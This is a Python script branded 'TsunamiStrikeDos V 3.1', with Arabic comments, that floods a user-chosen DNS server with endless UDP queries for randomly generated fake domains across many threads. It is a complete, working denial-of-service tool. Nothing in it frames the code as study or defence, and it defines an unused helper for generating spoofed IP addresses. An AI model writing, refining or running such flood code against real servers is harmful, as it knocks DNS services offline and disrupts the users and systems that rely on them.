import socket
import random
import threading
from colorama import Fore as F
from concurrent.futures import ThreadPoolExecutor

print(f'''
{F.GREEN}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                {F.CYAN} TsunamiStrikeDos {F.GREEN}V 3.1 {F.RESET}
''')


# دالة لتوليد اسم نطاق مزيف عشوائي
def generate_random_domain():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 15))) + ".com"

# دالة لتوليد IP وهمي (إن كنت ترغب في التزوير)
def generate_fake_ip():
    return ".".join(map(str, (random.randint(1, 255) for _ in range(4))))

# هجوم DNS
def dns_flood(target_ip, target_port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # استخدام UDP لأن DNS يعتمد عليه
    while True:
        domain = generate_random_domain()
        query_type = random.choice([b"\x00\x01", b"\x00\x1c", b"\x00\x0f"])  # A, AAAA, MX
        request = (
            b"\xAA\xAA"  # ID
            b"\x01\x00"  # Flags
            b"\x00\x01"  # Number of questions
            b"\x00\x00"  # Number of answers
            b"\x00\x00"  # Number of authority records
            b"\x00\x00"  # Number of additional records
        )
        for part in domain.split("."):
            request += bytes([len(part)]) + part.encode("utf-8")
        request += b"\x00"
        request += query_type  # استخدام نوع استعلام عشوائي
        request += b"\x00\x01"  # Query class: IN

        # إرسال الطلب إلى خادم DNS المستهدف
        sock.sendto(request, (target_ip, target_port))
        print(f"{F.CYAN}request Sent!{F.RESET} | domain fake: {F.GREEN}{domain}{F.RESET}")

# تشغيل الهجوم عبر عدة threads باستخدام ThreadPoolExecutor
def start_dns_flooding(target_ip, thread_count):
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count):
            executor.submit(dns_flood, target_ip)

if __name__ == "__main__":
    target_ip = input(f"{F.CYAN}[?]{F.RESET} target IP DNS: {F.GREEN}")
    num_threads = int(input(f"{F.CYAN}[?]{F.RESET} threads: {F.GREEN}"))
    start_dns_flooding(target_ip, num_threads)
